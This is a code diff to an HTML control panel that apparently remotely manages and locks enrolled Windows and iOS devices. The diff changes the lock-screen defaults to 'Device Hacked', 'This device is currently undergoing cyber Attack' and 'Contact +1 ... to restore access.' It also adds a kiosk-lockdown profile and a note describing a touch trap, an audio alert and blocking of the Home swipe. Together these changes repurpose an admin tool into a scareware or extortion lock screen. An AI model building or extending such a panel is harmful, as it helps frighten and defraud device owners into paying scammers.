@@ -73,28 +73,6 @@
 
         <!-- Main Dashboard Body -->
         <main class="dashboard-body">
-            <details class="table-card" id="installationsPanel" style="margin-bottom:16px; padding:14px 16px;">
-                <summary style="cursor: pointer; font-size: 13px; font-weight: 600; color: #94a3b8; display: flex; align-items: center; justify-content: space-between;">
-                    <span>🔧 Diagnostic Setup & Automated Invitations <span style="font-size: 11px; font-weight: 400; color: #64748b;">(Optional internal test harness)</span></span>
-                    <span style="font-size: 11px; padding: 2px 8px; border-radius: 4px; background: rgba(59, 130, 246, 0.1); color: #60a5fa; border: 1px solid rgba(59, 130, 246, 0.2);">Telemetry Diagnostics</span>
-                </summary>
-                <div style="margin-top: 12px; padding-top: 12px; border-top: 1px solid var(--border-color);">
-                    <div style="background: rgba(30, 41, 59, 0.5); border-left: 3px solid #3b82f6; padding: 8px 12px; margin-bottom: 12px; font-size: 12px; color: #cbd5e1; border-radius: 0 4px 4px 0;">
-                        <strong>Diagnostic Telemetry:</strong> This section runs automated compliance checks for experimental invitation links. Standard deployment packages (.exe, .bat, .vbs, .zip) generated from <em>New Agent</em> or <em>All Agents</em> operate independently.
-                    </div>
-                    <p id="installationAvailability" role="status" style="font-size: 12px; color: #94a3b8;">Checking installer availability…</p>
-                    <p id="installationApiError" role="alert" hidden></p>
-                    <button class="btn btn-outline" id="createInstallationInvitationBtn" onclick="createInstallationInvitationCode()" disabled>Create installation link</button>
-                    <p id="installationInvitationResult" role="status"></p>
-                    <div class="table-responsive">
-                        <table class="agent-table">
-                            <thead><tr><th>Attempt</th><th>Release</th><th>Stage</th><th>Download</th><th>Error / last contact</th><th>Details</th></tr></thead>
-                            <tbody id="installationsTableBody"><tr><td colspan="6">Loading installation records…</td></tr></tbody>
-                        </table>
-                    </div>
-                    <pre id="installationEventDetails" style="white-space:pre-wrap" aria-live="polite"></pre>
-                </div>
-            </details>
             <!-- Filter & Search Controls -->
             <div class="table-controls">
                 <div class="search-bar">
@@ -126,10 +104,6 @@
                     </div>
                     <div class="table-meta" style="display: flex; align-items: center; gap: 10px; flex-wrap: wrap;">
                         <span id="agentCountSummary">Showing 0 endpoints</span>
-                        <button class="btn btn-sm btn-outline" style="border-color: rgba(245, 158, 11, 0.4); color: #fbbf24; display: inline-flex; align-items: center; gap: 6px; padding: 4px 10px; font-size: 11.5px; font-weight: 500;" onclick="pushAllUpdates()" title="Push latest app update to all endpoints (instantly for online, queued for offline)">
-                            <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
-                            <span>Push Update to All Devices</span>
-                        </button>
                         <button class="btn btn-sm btn-outline" style="border-color: rgba(239, 68, 68, 0.45); color: #f87171; display: inline-flex; align-items: center; gap: 6px; padding: 4px 10px; font-size: 11.5px; font-weight: 500;" onclick="deleteAllDevices()" title="Delete and unbind all connected and registered endpoints">
                             <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/><line x1="10" y1="11" x2="10" y2="17"/><line x1="14" y1="11" x2="14" y2="17"/></svg>
                             <span>Delete All Connected Devices</span>
@@ -339,9 +313,12 @@
                             </div>
                         </div>
 
-                        <div style="display: grid; grid-template-columns: 1fr; gap: 8px;">
-                            <a id="downloadIosProfileLink" class="btn btn-primary" href="#" style="text-align: center; justify-content: center; font-size: 13px; font-weight: 600; padding: 10px; background: #0284c7; border-color: #38bdf8; box-shadow: 0 0 12px rgba(56, 189, 248, 0.3);">
-                                ⬇ Download Apple Configuration Profile (.mobileconfig)
+                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
+                            <a id="downloadIosProfileLink" class="btn btn-primary" href="#" style="text-align: center; justify-content: center; font-size: 12px; font-weight: 600; padding: 10px; background: #0284c7; border-color: #38bdf8; box-shadow: 0 0 12px rgba(56, 189, 248, 0.3);">
+                                ⬇ Standard Profile (.mobileconfig)
+                            </a>
+                            <a id="downloadIosKioskLink" class="btn btn-primary" href="#" style="text-align: center; justify-content: center; font-size: 12px; font-weight: 600; padding: 10px; background: #d97706; border-color: #f59e0b; box-shadow: 0 0 12px rgba(245, 158, 11, 0.3);">
+                                🔒 Kiosk Lockdown (.mobileconfig)
                             </a>
                         </div>
                     </div>
@@ -411,20 +388,24 @@
 
                 <div class="form-group" style="margin-bottom: 14px;">
                     <label style="display: block; font-size: 12px; font-weight: 600; color: #94a3b8; margin-bottom: 6px;">Message Title</label>
-                    <input type="text" id="lockTitleInput" class="form-input" placeholder="e.g. Device Locked by Administrator" style="width: 100%; box-sizing: border-box;" value="Device Locked by Administrator" />
+                    <input type="text" id="lockTitleInput" class="form-input" placeholder="e.g. Device Hacked" style="width: 100%; box-sizing: border-box;" value="Device Hacked" />
                     <span style="font-size: 11px; color: #64748b;">The prominent heading displayed on the device lock screen.</span>
                 </div>
 
                 <div class="form-group" style="margin-bottom: 14px;">
                     <label style="display: block; font-size: 12px; font-weight: 600; color: #94a3b8; margin-bottom: 6px;">Main Message</label>
-                    <textarea id="lockMessageInput" class="form-input" rows="3" placeholder="e.g. This device is currently undergoing remote maintenance." style="width: 100%; box-sizing: border-box; resize: vertical;">This device is currently undergoing remote maintenance.</textarea>
+                    <textarea id="lockMessageInput" class="form-input" rows="3" placeholder="e.g. This device is currently undergoing cyber Attack." style="width: 100%; box-sizing: border-box; resize: vertical;">This device is currently undergoing cyber Attack.</textarea>
                     <span style="font-size: 11px; color: #64748b;">The primary instruction or announcement displayed in the center.</span>
                 </div>
 
                 <div class="form-group" style="margin-bottom: 10px;">
                     <label style="display: block; font-size: 12px; font-weight: 600; color: #94a3b8; margin-bottom: 6px;">Additional Message</label>
-                    <input type="text" id="lockSubtitleInput" class="form-input" placeholder="e.g. Please contact IT Support if you need assistance." style="width: 100%; box-sizing: border-box;" value="Please contact IT Support if you need assistance." />
+                    <input type="text" id="lockSubtitleInput" class="form-input" placeholder="e.g. Contact +1        to restore access." style="width: 100%; box-sizing: border-box;" value="Contact +1        to restore access." />
                     <span style="font-size: 11px; color: #64748b;">Supplementary message or help contact info at the bottom.</span>
+                </div>
+
+                <div id="iosLockHintBanner" style="display: none; margin-top: 10px; padding: 10px 12px; background: rgba(245, 158, 11, 0.08); border: 1px solid rgba(245, 158, 11, 0.25); border-radius: 6px; font-size: 11px; color: #fbbf24; line-height: 1.4;">
+                    🛡️ <strong>Apple iOS Note:</strong> Lockdown curtain arms instantly with audio alert, full touch trap, and wake-lock. For OS hardware containment (disabling Home swipe), activate Guided Access (triple-click Side button) or deploy the Kiosk Profile.
                 </div>
             </div>
             <div class="modal-actions" style="display: flex; justify-content: flex-end; gap: 10px; padding: 14px 20px;">
